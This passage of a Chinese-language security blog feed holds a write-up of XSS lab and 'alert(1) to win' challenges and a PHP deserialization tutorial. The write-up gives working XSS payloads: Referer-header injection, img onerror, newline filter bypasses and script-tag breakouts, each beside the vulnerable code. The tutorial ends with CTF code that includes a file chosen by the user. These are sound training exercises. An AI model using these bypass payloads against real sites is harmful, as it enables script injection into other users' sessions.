<span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre><p>其他两个都没有可控点，<code>t_sort</code>无过滤且可控</p><p>level 11</p><p>这题没什么思路了，<code>t_sort</code>的双引号应该是实体化了无法闭合。看了网上wp是通过<code>s_ref</code>控制<code>referer</code>来绕过<br>使用bp抓包，改一下<code>referer</code>即可</p><p>payload: <code>referer: &quot; type=&quot;text&quot; onclick=&quot;alert(/xss/)&quot;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>没啥好分析的。。</p><p>level 12，13</p><p>ua 和 cookie 不分析了，抓包改就完事了</p><p>level 14<br>网站炸了做不了了，<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">wp地址</a></p><p>level 15<br>这题需要翻墙，没试过本地加载<code>AngularJS</code>，利用的是<code>AngularJS</code>的<code>文件包含</code>，从<code>src</code>参数包含一个文件，达到<code>xss</code>的目的</p><p>payload: <code>scr=&#39;level1.php?name=&lt;img%20src=x%20onerror=alert(1)&gt;&#39;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span></code></pre><p>可以看到，直接将src的内容输出到了<code>include</code>上</p><p>level 16<br>测试发现<code>script,空格,/</code>被转化成空格实体<code>&amp;nbsp;</code>，这里可以使用php常用的手法，空字节绕过<br>类似<code>%0a,%0c,%0d</code>这类空字节绕过空格，用<code>&#39;</code>代替<code>/</code>绕过</p><p>payload:  <code>&lt;img%0asrc=%0aonerror=alert(&#39;xss&#39;)&gt;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"    "</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>一样的</p><p>level 17<br>可以直接执行。。并不是flash</p><p>payload: <code>arg01=a&amp;arg02=b%20%20onmouseover=alert(1)</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;embed src=xsf01.swf?"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg01"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"="</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg02"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" width=100% heigth=100%>"</span><span class="token punctuation">;</span></code></pre><h2 id="alert-1-to-win"><a href="#alert-1-to-win" class="headerlink" title="alert(1) to win"></a>alert(1) to win</h2><h4 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span><span class="token operator">+</span>s<span class="token operator">+</span><span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>闭合<code>&quot;)</code><br><code>&lt;script&gt;console.log(&quot;&quot;);alert(1)//&quot;);&lt;/script&gt;</code></p><p>payload: <code>&quot;);alert(1)//</code></p><h4 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>  s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>把转义符转转义掉<br><code>&lt;script&gt;console.log(&quot;\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></p><p>payload: <code>\&quot;);alert(1)//</code></p><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>  s <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log('</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">');&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>SON.stringify()</code>方法会转义<code>\</code>和<code>&quot;</code><br><code>&lt;script&gt;console.log(&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&quot;);&lt;/script&gt;</code></p><p>payload: <code>)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code></p><h4 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'javascript:console.log('</span> <span class="token operator">+</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a<span class="token punctuation">.</span>href <span class="token operator">=</span> url<span class="token punctuation">;</span>  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  a<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2019/07/15/php-fan-xu-lie-hua/"/>
      <url>/2019/07/15/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h2><p>php序列化后的内容是简单的文本格式，但对字母大小写和空白敏感，而字符串是按照字节(或者说是8位的字符)计算的，因此更适合的说法是php序列化的内容是字节流格式</p><p>布尔型</p><pre class=" language-php"><code class="language-php">bool<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>digit</span><span class="token punctuation">></span></span></span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>序列化后<span class="token punctuation">:</span> b<span class="token punctuation">:</span><span class="token number">1</span></code></pre><p>整数型</p><pre class=" language-php"><code class="language-php">int<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span></span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>序列化后<span class="token punctuation">:</span> i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><p>double型</p><pre class=" language-php"><code class="language-php">double<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span></span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">1.23</span><span class="token punctuation">;</span>序列化后<span class="token punctuation">:</span> d<span class="token punctuation">:</span><span class="token number">1.23</span>另外如果序列化无穷大或序列化超过php能表示的最大数d<span class="token punctuation">:</span><span class="token constant">INF</span>负无穷大d<span class="token punctuation">:</span><span class="token operator">-</span><span class="token constant">INF</span>超过php的最小精度d<span class="token punctuation">:</span><span class="token number">0</span></code></pre><p>字符串</p><pre class=" language-php"><code class="language-php">string<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>length</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span></span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"nice"</span><span class="token punctuation">;</span>序列化后<span class="token punctuation">:</span> s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"nice"</span><span class="token punctuation">;</span></code></pre><p>NULL</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>序列化后<span class="token punctuation">:</span> N<span class="token punctuation">;</span></code></pre><p>数组</p><pre class=" language-php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>length</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span></span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"is"</span><span class="token punctuation">,</span><span class="token string">"the"</span><span class="token punctuation">,</span><span class="token string">"best"</span><span class="token punctuation">,</span><span class="token string">"language"</span><span class="token punctuation">)</span>序列化后<span class="token punctuation">:</span> a<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"php"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"is"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"the"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"best"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"language"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对象</p><pre class=" language-php"><code class="language-php">object<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class_name_length</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token string">"class_name"</span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>number_of_properties</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filed_name1</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_value1</span><span class="token punctuation">></span></span></span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filed_namen</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filed_namen</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filed_valuen</span><span class="token punctuation">></span></span></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//filed_name为字段名，字符串类型，它序列化后与字符串序列化一样    </span>序列化后<span class="token punctuation">:</span> O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"mntn"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"ID"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$var2</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$var3</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$demo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$demo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//屏幕输出O:4:"Demo":3:{s:4:"var1";N;s:10:"Demovar2";N;s:7:"*var3";N;}</span></code></pre><p>实际上，对象中的变量被序列化时会发生改变</p><p>私有变量private 被序列化时 会变成 %00Demo%00var2 即 %00 + 类名 + %00 + 属性名</p><p>共有变量public 被序列化时不改变</p><p>受保护变量protected 被序列化时 会变成 %00<em>%00var3 即 %00 + ‘\</em>‘ + %00 + 属性名</p><p>在传递参数的时候需要带上否则无法生效</p><h2 id="对象序列化中的魔术方法"><a href="#对象序列化中的魔术方法" class="headerlink" title="对象序列化中的魔术方法"></a>对象序列化中的魔术方法</h2><p><code>__construct</code> 构造函数，初始化对象的时候触发</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"this is construct test"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>__destruct</code> 析构函数，对象销毁的时候触发</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"this is destruct test"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>__toString</code> 对象被当作字符串时触发</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"this is test"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></code></pre><p><code>__sleep</code> 类被序列化时会先调用<code>__sleep</code>方法，返回需要被序列化保留的属性</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">'var1'</span><span class="token punctuation">,</span><span class="token string">'var2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O:4:"Test":2:{s:4:"var1";N;s:4:"var2";N;}</span></code></pre><p><code>__wakeup</code> 类被反序列化的时候会先调用<code>__wakeup</code>方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>综合</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Magic_methods</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span> <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"run __construct&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"run __destruct&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"run __toString&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">var1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"run __sleep&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'var1'</span><span class="token punctuation">,</span><span class="token string">'var2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"run __wakeup&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 创建一个新对象，会先调用__construct()</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Magic_methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 将对象当作字符串输出，会先调用__toString()</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调用serialize()之前先调用__sleep()</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调用unserialize()之前会先调用__wakeup()</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 此处又一次调用了__toString()</span><span class="token comment" spellcheck="true">// 脚本执行完毕，即将销毁所有创建的对象，此时调用__destruct()</span><span class="token comment" spellcheck="true">// 反序列化恢复的对象被销毁，再次调用__desruct()</span><span class="token comment" spellcheck="true">// 所以这里调用了2次__destruct()</span></code></pre><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string">"D0g3!!!"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>利用前面的构造反序列化字符串知识可构造<code>s:7:&quot;D0g3!!!&quot;</code>,提交即可</p><pre class=" language-php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"txt"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the bugkuctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"hello admin!&lt;br>"</span><span class="token punctuation">;</span>      <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//hint.php  </span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"you are not admin ! "</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  